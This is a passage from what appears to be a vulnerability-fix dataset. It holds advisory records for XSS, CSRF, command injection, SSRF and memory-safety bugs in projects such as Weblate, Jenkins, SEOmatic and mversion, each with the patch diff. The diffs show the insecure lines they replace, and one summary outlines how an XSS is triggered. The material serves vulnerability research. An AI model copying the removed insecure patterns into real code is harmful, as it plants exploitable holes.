'4e46b792ce973ac0c652fb330055f41aca1981c8']","before_first_fix_commit":"{'8c0dc48d026fd076cd0a8fae917bdadc8d67cfa6'}","last_fix_commit":"4e46b792ce973ac0c652fb330055f41aca1981c8","chain_ord_pos":2.0,"commit_datetime":"09\/24\/2021, 15:01:54","message":"Disallow SVGs","author":"Andrew Welch","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/controllers\/FileController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nystudio107\/craft-seomatic\/raw\/4e46b792ce973ac0c652fb330055f41aca1981c8\/src%2Fcontrollers%2FFileController.php', 'patch': \"@@ -96,7 +96,7 @@ public function actionSeoFileLink($url, $robots = '', $canonical = '', $inline =\\n             if (($ext = pathinfo($fileName, PATHINFO_EXTENSION)) !== '') {\\n                 $ext = strtolower($ext);\\n             }\\n-            if ($ext === '' || !in_array($ext, $allowedExtensions, true)) {\\n+            if ($ext === '' || $ext === 'svg' || !in_array($ext, $allowedExtensions, true)) {\\n                 throw new ServerErrorHttpException(Craft::t('seomatic', 'File format not allowed.'));\\n             }\\n             \/\/ Send the file as a stream, so it can exist anywhere\"}}","message_norm":"disallow svgs","language":"it","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/controllers\/FileController.php'])","num_files":1.0},{"index":849,"vuln_id":"GHSA-6hjc-m38h-7jhh","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/4e46b792ce973ac0c652fb330055f41aca1981c8', 'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873'}","dataset":"osv","summary":"Cross-site Scripting in SEOmatic plugin A cross-site scripting (XSS) vulnerability in the SEOmatic plugin 3.4.10 for Craft CMS 3 allows remote attackers to inject arbitrary web script via a GET to \/index.php?action=seomatic\/file\/seo-file-link with url parameter containing the base64 encoded URL of a malicious web page \/ file and fileName parameter containing an arbitrary filename with the intended content-type to be rendered in the user's browser as the extension.","published_date":"2022-06-13","chain_len":2,"project":"https:\/\/github.com\/nystudio107\/craft-seomatic","commit_href":"https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873","commit_sha":"5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873","patch":"MULTI","chain_ord":"['5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873', '4e46b792ce973ac0c652fb330055f41aca1981c8']","before_first_fix_commit":"{'8c0dc48d026fd076cd0a8fae917bdadc8d67cfa6'}","last_fix_commit":"4e46b792ce973ac0c652fb330055f41aca1981c8","chain_ord_pos":1.0,"commit_datetime":"09\/24\/2021, 01:25:40","message":"Ensure that only files with the extensions listed in `allowedFileExtensions` General Config setting can be used with the SEO File Link controller\n\nSigned-off-by: Andrew Welch <andrew@nystudio107.com>","author":"Andrew Welch","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'src\/controllers\/FileController.php': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nystudio107\/craft-seomatic\/raw\/5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873\/src%2Fcontrollers%2FFileController.php', 'patch': '@@ -15,12 +15,15 @@\\n use nystudio107\\\\seomatic\\\\Seomatic;\\n \\n use Craft;\\n+use craft\\\\elements\\\\Asset;\\n use craft\\\\helpers\\\\FileHelper;\\n+use craft\\\\helpers\\\\Assets as AssetsHelper;\\n use craft\\\\web\\\\Controller;\\n \\n use yii\\\\web\\\\NotFoundHttpException;\\n use yii\\\\web\\\\HttpException;\\n use yii\\\\web\\\\Response;\\n+use yii\\\\web\\\\ServerErrorHttpException;\\n \\n \/**\\n  * @author    nystudio107\\n@@ -87,6 +90,15 @@ public function actionSeoFileLink($url, $robots = \\'\\', $canonical = \\'\\', $inline =\\n                 $headerValue = \\'<\\'.$canonical.\\'>; rel=\"canonical\"\\';\\n                 $response->headers->add(\\'Link\\', $headerValue);\\n             }\\n+            \/\/ Ensure the file type is allowed\\n+            \/\/ ref: https:\/\/craftcms.com\/docs\/3.x\/config\/config-settings.html#allowedfileextensions\\n+            $allowedExtensions = Craft::$app->getConfig()->getGeneral()->allowedFileExtensions;\\n+            if (($ext = pathinfo($fileName, PATHINFO_EXTENSION)) !== \\'\\') {\\n+                $ext = strtolower($ext);\\n+            }\\n+            if ($ext === \\'\\' || !in_array($ext, $allowedExtensions, true)) {\\n+                throw new ServerErrorHttpException(Craft::t(\\'seomatic\\', \\'File format not allowed.\\'));\\n+            }\\n             \/\/ Send the file as a stream, so it can exist anywhere\\n             $response->sendContentAsFile(\\n                 $contents,'}}","message_norm":"ensure that only files with the extensions listed in `allowedfileextensions` general config setting can be used with the seo file link controller\n\nsigned-off-by: andrew welch <andrew@nystudio107.com>","language":"en","entities":"[('ensure', 'ACTION', ''), ('andrew@nystudio107.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/controllers\/FileController.php'])","num_files":1.0},{"index":852,"vuln_id":"GHSA-6j89-jhpr-849f","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/3fe5e24694729966a157dc613f5586a6c75f1e9b', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1308, CVE-2019-1335, CVE-2019-1366.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/3fe5e24694729966a157dc613f5586a6c75f1e9b","commit_sha":"3fe5e24694729966a157dc613f5586a6c75f1e9b","patch":"MULTI","chain_ord":"['3fe5e24694729966a157dc613f5586a6c75f1e9b', 'cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d']","before_first_fix_commit":"{'7e9a2ee60baa95ceb4f48f522f823c812ca90c80', '5989c6e038d80f92dcd8e10d725cdf45396201bb'}","last_fix_commit":"cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d","chain_ord_pos":1.0,"commit_datetime":"09\/03\/2019, 19:26:32","message":"CVE-2019-1307","author":"Paul Leathers","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'lib\/Backend\/GlobOpt.h': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/3fe5e24694729966a157dc613f5586a6c75f1e9b\/lib%2FBackend%2FGlobOpt.h', 'patch': '@@ -370,6 +370,7 @@ class JsArrayKills\\n             (valueType.IsArrayOrObjectWithArray() &&\\n              (\\n               (killsArraysWithNoMissingValues && valueType.HasNoMissingValues()) ||\\n+              (killsObjectArraysWithNoMissingValues && !valueType.IsArray() && valueType.HasNoMissingValues()) ||\\n               (killsNativeArrays && !valueType.HasVarElements())\\n              )\\n             );'}}","message_norm":"cve-2019-1307","language":"ro","entities":"[('cve-2019-1307', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOpt.h'])","num_files":1.0},{"index":855,"vuln_id":"GHSA-6jmh-9gqm-5xrx","cwe_id":"{'CWE-352'}","score":4.3,"chain":"{'https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/f59ffb02984c0ce2fbb19ac39365066507de9370'}","dataset":"osv","summary":"Cross-Site Request Forgery (CSRF) in livehelperchat A CSRF issue is found in the audit configuration under settings. It was found that no CSRF token validation is getting done on the server-side. If we remove the CSRF token and keep the CSRF token field empty, the action is getting performed.","published_date":"2022-01-26","chain_len":1,"project":"https:\/\/github.com\/livehelperchat\/livehelperchat","commit_href":"https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/f59ffb02984c0ce2fbb19ac39365066507de9370","commit_sha":"f59ffb02984c0ce2fbb19ac39365066507de9370","patch":"SINGLE","chain_ord":"['f59ffb02984c0ce2fbb19ac39365066507de9370']","before_first_fix_commit":"{'58df43e89c5b2c11be4994a71e84c93d469dc7bd'}","last_fix_commit":"f59ffb02984c0ce2fbb19ac39365066507de9370","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2022, 19:04:29","message":"Missing csfr check","author":"Remigijus Kiminas","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'lhc_web\/modules\/lhaudit\/configuration.php': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/LiveHelperChat\/livehelperchat\/raw\/f59ffb02984c0ce2fbb19ac39365066507de9370\/lhc_web%2Fmodules%2Flhaudit%2Fconfiguration.php', 'patch': \"@@ -7,6 +7,11 @@\\n \\n if ( isset($_POST['StoreOptions']) ) {\\n \\n+    if (!isset($_POST['csfr_token']) || !$currentUser->validateCSFRToken($_POST['csfr_token'])) {\\n+        erLhcoreClassModule::redirect();\\n+        exit;\\n+    }\\n+    \\n     $definition = array(\\n         'days_log' => new ezcInputFormDefinitionElement(ezcInputFormDefinitionElement::OPTIONAL, 'int'),\\n         'log_js' => new ezcInputFormDefinitionElement(ezcInputFormDefinitionElement::OPTIONAL, 'boolean'),\"}}","message_norm":"missing csfr check","language":"de","entities":"[('csfr', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lhc_web\/modules\/lhaudit\/configuration.php'])","num_files":1.0},{"index":858,"vuln_id":"GHSA-6jp6-9rf9-gc66","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/9e19a8414337692cc90da2a91c9af5420f2952f1', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/f6753a1a1c63fade6ad418fbda827c6750ab0bda', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/22d577b1f1e88665a88b4569380148030e0f8389'}","dataset":"osv","summary":"Cross-site Scripting in Weblate ### Impact\nDue to improper neutralization, it was possible to perform cross-site scripting via crafted user and language names.\n\n### Patches\n\nThe issues were fixed in the 4.11 release. The following commits are addressing it:\n\n* f6753a1a1c63fade6ad418fbda827c6750ab0bda\n* 9e19a8414337692cc90da2a91c9af5420f2952f1\n* 22d577b1f1e88665a88b4569380148030e0f8389\n\n### Workarounds\n\nYou can look for crafted user and language names to see if you were affected.\n\n### References\n* https:\/\/hackerone.com\/reports\/1486674\n* https:\/\/hackerone.com\/reports\/1486718\n* https:\/\/hackerone.com\/reports\/1485226\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a topic in [discussions](https:\/\/github.com\/WeblateOrg\/weblate\/discussions)\n* Email us at [care@weblate.org](mailto:care@weblate.org)","published_date":"2022-02-25","chain_len":3,"project":"https:\/\/github.com\/WeblateOrg\/weblate","commit_href":"https:\/\/github.com\/WeblateOrg\/weblate\/commit\/9e19a8414337692cc90da2a91c9af5420f2952f1","commit_sha":"9e19a8414337692cc90da2a91c9af5420f2952f1","patch":"MULTI","chain_ord":"['22d577b1f1e88665a88b4569380148030e0f8389', '9e19a8414337692cc90da2a91c9af5420f2952f1', 'f6753a1a1c63fade6ad418fbda827c6750ab0bda']","before_first_fix_commit":"{'572628cef60e9d839b79b2087960b606a5cca4d8'}","last_fix_commit":"f6753a1a1c63fade6ad418fbda827c6750ab0bda","chain_ord_pos":2.0,"commit_datetime":"02\/22\/2022, 20:00:41","message":"js: Add missing escaping to username completion\n\nFixes https:\/\/hackerone.com\/reports\/1486674","author":"Michal \u010ciha\u0159","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'weblate\/static\/loader-bootstrap.js': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WeblateOrg\/weblate\/raw\/9e19a8414337692cc90da2a91c9af5420f2952f1\/weblate%2Fstatic%2Floader-bootstrap.js', 'patch': '@@ -1131,7 +1131,9 @@ $(function () {\\n       return \"\";\\n     },\\n     menuItemTemplate: function (item) {\\n-      return `<a>${item.string}<\/a>`;\\n+      let link = document.createElement(\"a\");\\n+      link.innerText = item.string;\\n+      return link.outerHTML;\\n     },\\n     values: (text, callback) => {\\n       $.ajax({'}}","message_norm":"js: add missing escaping to username completion\n\nfixes https:\/\/hackerone.com\/reports\/1486674","language":"en","entities":"[('add', 'ACTION', ''), ('escaping', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('https:\/\/hackerone.com\/reports\/1486674', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['weblate\/static\/loader-bootstrap.js'])","num_files":1.0},{"index":859,"vuln_id":"GHSA-6jp6-9rf9-gc66","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/9e19a8414337692cc90da2a91c9af5420f2952f1', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/f6753a1a1c63fade6ad418fbda827c6750ab0bda', 'https:\/\/github.com\/WeblateOrg\/weblate\/commit\/22d577b1f1e88665a88b4569380148030e0f8389'}","dataset":"osv","summary":"Cross-site Scripting in Weblate ### Impact\nDue to improper neutralization, it was possible to perform cross-site scripting via crafted user and language names.\n\n### Patches\n\nThe issues were fixed in the 4.11 release. The following commits are addressing it:\n\n* f6753a1a1c63fade6ad418fbda827c6750ab0bda\n* 9e19a8414337692cc90da2a91c9af5420f2952f1\n* 22d577b1f1e88665a88b4569380148030e0f8389\n\n### Workarounds\n\nYou can look for crafted user and language names to see if you were affected.\n\n### References\n* https:\/\/hackerone.com\/reports\/1486674\n* https:\/\/hackerone.com\/reports\/1486718\n* https:\/\/hackerone.com\/reports\/1485226\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a topic in [discussions](https:\/\/github.com\/WeblateOrg\/weblate\/discussions)\n* Email us at [care@weblate.org](mailto:care@weblate.org)","published_date":"2022-02-25","chain_len":3,"project":"https:\/\/github.com\/WeblateOrg\/weblate","commit_href":"https:\/\/github.com\/WeblateOrg\/weblate\/commit\/f6753a1a1c63fade6ad418fbda827c6750ab0bda","commit_sha":"f6753a1a1c63fade6ad418fbda827c6750ab0bda","patch":"MULTI","chain_ord":"['22d577b1f1e88665a88b4569380148030e0f8389', '9e19a8414337692cc90da2a91c9af5420f2952f1', 'f6753a1a1c63fade6ad418fbda827c6750ab0bda']","before_first_fix_commit":"{'572628cef60e9d839b79b2087960b606a5cca4d8'}","last_fix_commit":"f6753a1a1c63fade6ad418fbda827c6750ab0bda","chain_ord_pos":3.0,"commit_datetime":"02\/22\/2022, 20:10:41","message":"translate: Add missing escaping to language name\n\nFixes https:\/\/hackerone.com\/reports\/1486674","author":"Michal \u010ciha\u0159","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'weblate\/trans\/forms.py': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/WeblateOrg\/weblate\/raw\/f6753a1a1c63fade6ad418fbda827c6750ab0bda\/weblate%2Ftrans%2Fforms.py', 'patch': '@@ -37,6 +37,7 @@\\n from django.template.loader import render_to_string\\n from django.urls import reverse\\n from django.utils import timezone\\n+from django.utils.html import escape\\n from django.utils.http import urlencode\\n from django.utils.safestring import mark_safe\\n from django.utils.translation import gettext\\n@@ -318,7 +319,7 @@ def render(self, name, value, attrs=None, renderer=None, **kwargs):\\n             # Render textare\\n             textarea = super().render(fieldname, val, attrs, renderer, **kwargs)\\n             # Label for plural\\n-            label = str(unit.translation.language)\\n+            label = escape(unit.translation.language)\\n             if len(values) != 1:\\n                 label = f\"{label}, {plural.get_plural_label(idx)}\"\\n             ret.append('}}","message_norm":"translate: add missing escaping to language name\n\nfixes https:\/\/hackerone.com\/reports\/1486674","language":"en","entities":"[('add', 'ACTION', ''), ('escaping', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('https:\/\/hackerone.com\/reports\/1486674', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['weblate\/trans\/forms.py'])","num_files":1.0},{"index":863,"vuln_id":"GHSA-6jv7-28mv-qp9c","cwe_id":"{'CWE-862'}","score":4.3,"chain":"{'https:\/\/github.com\/jenkinsci\/autonomiq-plugin\/commit\/e06b1ff67664a90819c9561bbc12f4c6e593d1dc'}","dataset":"osv","summary":"Missing permission check in Jenkins autonomiq Plugin A missing permission check in Jenkins autonomiq Plugin 1.15 and earlier allows attackers with Overall\/Read permission to connect to an attacker-specified URL using attacker-specified credentials.","published_date":"2022-02-16","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/autonomiq-plugin","commit_href":"https:\/\/github.com\/jenkinsci\/autonomiq-plugin\/commit\/e06b1ff67664a90819c9561bbc12f4c6e593d1dc","commit_sha":"e06b1ff67664a90819c9561bbc12f4c6e593d1dc","patch":"SINGLE","chain_ord":"['e06b1ff67664a90819c9561bbc12f4c6e593d1dc']","before_first_fix_commit":"{'abfbe8a84d54ec7708c8ef073d56b128baffb1f5'}","last_fix_commit":"e06b1ff67664a90819c9561bbc12f4c6e593d1dc","chain_ord_pos":1.0,"commit_datetime":"02\/09\/2022, 07:16:27","message":"added permission and csrf protection","author":"jameeluddin","comments":null,"stats":"{'additions': 17, 'deletions': 0, 'total': 17}","files":"{'src\/main\/java\/io\/jenkins\/plugins\/autonomiq\/AutonomiqBuilder.java': {'additions': 17, 'deletions': 0, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/autonomiq-plugin\/raw\/e06b1ff67664a90819c9561bbc12f4c6e593d1dc\/src%2Fmain%2Fjava%2Fio%2Fjenkins%2Fplugins%2Fautonomiq%2FAutonomiqBuilder.java', 'patch': '@@ -653,6 +653,7 @@ public String getDisplayName() {\\n         }\\n \\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillProjectItems(@QueryParameter String aiqUrl,\\n                                                @QueryParameter String login,\\n                                                @QueryParameter Secret password,\\n@@ -661,6 +662,8 @@ public ListBoxModel doFillProjectItems(@QueryParameter String aiqUrl,\\n                                                @QueryParameter String proxyUser,\\n                                                @QueryParameter Secret proxyPassword,\\n                                                @QueryParameter Boolean httpProxy) {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n+\\n \\n             \/\/ make sure other fields have been filled in\\n             if (aiqUrl.length() > 0 && login.length() > 0 && Secret.toString(password).length() > 0) {\\n@@ -681,7 +684,10 @@ public ListBoxModel doFillProjectItems(@QueryParameter String aiqUrl,\\n         }\\n \\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillPlatformTestCasesItems() {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n+\\n \\n             String[] values = {\"Linux\"};  \/\/, \"Windows\"};\\n \\n@@ -690,7 +696,10 @@ public ListBoxModel doFillPlatformTestCasesItems() {\\n             return new ListBoxModel(options);\\n         }\\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillPlatformTestSuitesItems() {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n+\\n \\n             String[] values = {\"Linux\"};  \/\/, \"Windows\"};\\n \\n@@ -701,7 +710,10 @@ public ListBoxModel doFillPlatformTestSuitesItems() {\\n \\n \\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillBrowserTestCasesItems() {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n+\\n \\n             String[] values = {\"Chrome\", \"Firefox\"};\\n \\n@@ -710,7 +722,9 @@ public ListBoxModel doFillBrowserTestCasesItems() {\\n             return new ListBoxModel(options);\\n         }\\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillBrowserTestSuitesItems() {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n \\n             String[] values = {\"Chrome\", \"Firefox\"};\\n \\n@@ -720,7 +734,10 @@ public ListBoxModel doFillBrowserTestSuitesItems() {\\n         }\\n \\n         @SuppressWarnings(\"unused\")\\n+        @POST\\n         public ListBoxModel doFillExecutionModeItems() {\\n+        \\tJenkins.get().checkPermission(Jenkins.ADMINISTER);\\n+\\n \\n             String[] values = {\"serial\", \"parallel\"};'}}","message_norm":"added permission and csrf protection","language":"en","entities":"[('added', 'ACTION', ''), ('permission', 'SECWORD', ''), ('csrf', 'SECWORD', ''), ('protection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/io\/jenkins\/plugins\/autonomiq\/AutonomiqBuilder.java'])","num_files":1.0},{"index":865,"vuln_id":"GHSA-6m26-25q2-cq46","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/c897d0dc159849763a813184d9b75b966c6360bf'}","dataset":"osv","summary":"Cross-site Scripting in microweber Microweber Cross-site Scripting (XSS) - Stored XSS vulnerability on admin page up to version 1.3.","published_date":"2022-02-27","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/c897d0dc159849763a813184d9b75b966c6360bf","commit_sha":"c897d0dc159849763a813184d9b75b966c6360bf","patch":"SINGLE","chain_ord":"['c897d0dc159849763a813184d9b75b966c6360bf']","before_first_fix_commit":"{'7d3e768be798979e82778c47fbabfbd944ec8ea7'}","last_fix_commit":"c897d0dc159849763a813184d9b75b966c6360bf","chain_ord_pos":1.0,"commit_datetime":"02\/25\/2022, 09:57:42","message":"add xss clean to create media dir method","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'src\/MicroweberPackages\/Media\/MediaManager.php': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/c897d0dc159849763a813184d9b75b966c6360bf\/src%2FMicroweberPackages%2FMedia%2FMediaManager.php', 'patch': \"@@ -4,6 +4,7 @@\\n \\n use Conner\\\\Tagging\\\\Model\\\\Tagged;\\n use \\\\Intervention\\\\Image\\\\ImageManagerStatic as Image;\\n+use MicroweberPackages\\\\Helper\\\\HTMLClean;\\n use MicroweberPackages\\\\Media\\\\Models\\\\Media;\\n use MicroweberPackages\\\\Media\\\\Models\\\\MediaThumbnail;\\n use MicroweberPackages\\\\Utils\\\\Media\\\\Thumbnailer;\\n@@ -1184,6 +1185,10 @@ public function thumbnail_img($params)\\n \\n     public function create_media_dir($params)\\n     {\\n+\\n+        $clean = new HTMLClean();\\n+        $_REQUEST = $clean->cleanArray($_REQUEST);\\n+\\n         must_have_access();\\n         $resp = array();\\n         \/\/ $target_path = media_base_path() . 'uploaded' . DS;\\n@@ -1198,7 +1203,7 @@ public function create_media_dir($params)\\n \\n             $target_path = $fn_path;\\n         }\\n-        if (!isset($_REQUEST['name'])) {\\n+        if (!isset($_REQUEST['name']) || empty($_REQUEST['name'])) {\\n             $resp = array('error' => 'You must send new_folder parameter');\\n         } else {\\n             $fn_new_folder_path = $_REQUEST['name'];\"}}","message_norm":"add xss clean to create media dir method","language":"en","entities":"[('add', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Media\/MediaManager.php'])","num_files":1.0},{"index":866,"vuln_id":"GHSA-6m8p-4fxj-pgc2","cwe_id":"{'CWE-78'}","score":7.8,"chain":"{'https:\/\/github.com\/mikaelbr\/mversion\/commit\/b7a8b32600e60759a7ad3921ec4a2750bf173482'}","dataset":"osv","summary":"OS Command Injection in mversion The issue occurs because tagName user input is formatted inside the exec function is executed without any checks.","published_date":"2021-05-17","chain_len":1,"project":"https:\/\/github.com\/mikaelbr\/mversion","commit_href":"https:\/\/github.com\/mikaelbr\/mversion\/commit\/b7a8b32600e60759a7ad3921ec4a2750bf173482","commit_sha":"b7a8b32600e60759a7ad3921ec4a2750bf173482","patch":"SINGLE","chain_ord":"['b7a8b32600e60759a7ad3921ec4a2750bf173482']","before_first_fix_commit":"{'a9ddbc2bc86eb48f6976b85d195b6a94e81ffb22'}","last_fix_commit":"b7a8b32600e60759a7ad3921ec4a2750bf173482","chain_ord_pos":1.0,"commit_datetime":"06\/23\/2020, 22:02:33","message":"Fix Remote Command Execution","author":"hbkhan","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/git.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mikaelbr\/mversion\/raw\/b7a8b32600e60759a7ad3921ec4a2750bf173482\/lib%2Fgit.js', 'patch': '@@ -61,7 +61,7 @@ module.exports.commit = function (files, message, newVer, tagName, callback) {\\n \\n     function (done) {\\n       cp.exec(\\n-        [gitApp, \"tag\", \"-a\", tagName, \"-m\", message].join(\" \"),\\n+        [gitApp, \"tag\", \"-a\", escapeQuotes(tagName), \"-m\", message].join(\" \"),\\n         gitExtra,\\n         done\\n       );'}}","message_norm":"fix remote command execution","language":"en","entities":"[('fix', 'ACTION', ''), ('command execution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/git.js'])","num_files":1.0},{"index":871,"vuln_id":"GHSA-6mv9-hcx5-7mhh","cwe_id":"{'CWE-918'}","score":5.3,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/2d16b459205730d85e51499c2457109b234ca9d9'}","dataset":"osv","summary":"Server-Side Request Forgery in Jenkins An improper authorization vulnerability exists in Jenkins versions 2.106 and earlier, and LTS 2.89.3 and earlier, that allows an attacker to have Jenkins submit HTTP GET requests and get limited information about the response.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/2d16b459205730d85e51499c2457109b234ca9d9","commit_sha":"2d16b459205730d85e51499c2457109b234ca9d9","patch":"SINGLE","chain_ord":"['2d16b459205730d85e51499c2457109b234ca9d9']","before_first_fix_commit":"{'ccc374a7176d7704941fb494589790b7673efe2e'}","last_fix_commit":"2d16b459205730d85e51499c2457109b234ca9d9","chain_ord_pos":1.0,"commit_datetime":"01\/30\/2018, 17:15:48","message":"[SECURITY-506] Require admin permission to validate proxy config.","author":"Jesse Glick","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'core\/src\/main\/java\/hudson\/ProxyConfiguration.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/2d16b459205730d85e51499c2457109b234ca9d9\/core%2Fsrc%2Fmain%2Fjava%2Fhudson%2FProxyConfiguration.java', 'patch': '@@ -341,6 +341,8 @@ public FormValidation doValidateProxy(\\n                 @QueryParameter(\"userName\") String userName, @QueryParameter(\"password\") String password,\\n                 @QueryParameter(\"noProxyHost\") String noProxyHost) {\\n \\n+            Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);\\n+\\n             if (Util.fixEmptyAndTrim(testUrl) == null) {\\n                 return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\\n             }'}}","message_norm":"[security-506] require admin permission to validate proxy config.","language":"en","entities":"[('security-506', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('permission', 'SECWORD', ''), ('validate', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/hudson\/ProxyConfiguration.java'])","num_files":1.0},{"index":872,"vuln_id":"GHSA-6p56-wp2h-9hxr","cwe_id":"{'CWE-120'}","score":5.3,"chain":"{'https:\/\/github.com\/numpy\/numpy\/commit\/ae317fd9ff3e79c0eac357d723bfc29cbd625f2e'}","dataset":"osv","summary":"NumPy Buffer Overflow (Disputed) A Buffer Overflow vulnerability exists in NumPy 1.9.x in the PyArray_NewFromDescr_int function of ctors.c when specifying arrays of large dimensions (over 32) from Python code, which could let a malicious user cause a Denial of Service.\n\nNOTE: The vendor does not agree this is a vulneraility; In (very limited) circumstances a user may be able provoke the buffer overflow, the user is most likely already privileged to at least provoke denial of service by exhausting memory. Triggering this further requires the use of uncommon API (complicated structured dtypes), which is very unlikely to be available to an unprivileged user.","published_date":"2022-01-07","chain_len":1,"project":"https:\/\/github.com\/numpy\/numpy","commit_href":"https:\/\/github.com\/numpy\/numpy\/commit\/ae317fd9ff3e79c0eac357d723bfc29cbd625f2e","commit_sha":"ae317fd9ff3e79c0eac357d723bfc29cbd625f2e","patch":"SINGLE","chain_ord":"['ae317fd9ff3e79c0eac357d723bfc29cbd625f2e']","before_first_fix_commit":"{'938fe1f871e22b8f5556b946135fa700e5ebcce1', '16f7824b4d935b6aee98298ca4123d57174a6f2e'}","last_fix_commit":"ae317fd9ff3e79c0eac357d723bfc29cbd625f2e","chain_ord_pos":1.0,"commit_datetime":"05\/11\/2021, 19:39:32","message":"Merge pull request #18989 from yetanothercheer\/gh-18939-potential_buffer_overflow\n\nBUG: fix potential buffer overflow(#18939)","author":"Charles Harris","comments":null,"stats":"{'additions': 8, 'deletions': 8, 'total': 16}","files":"{'numpy\/core\/src\/multiarray\/ctors.c': {'additions': 8, 'deletions': 8, 'changes': 16, 'status': 'modified', 'raw_url': 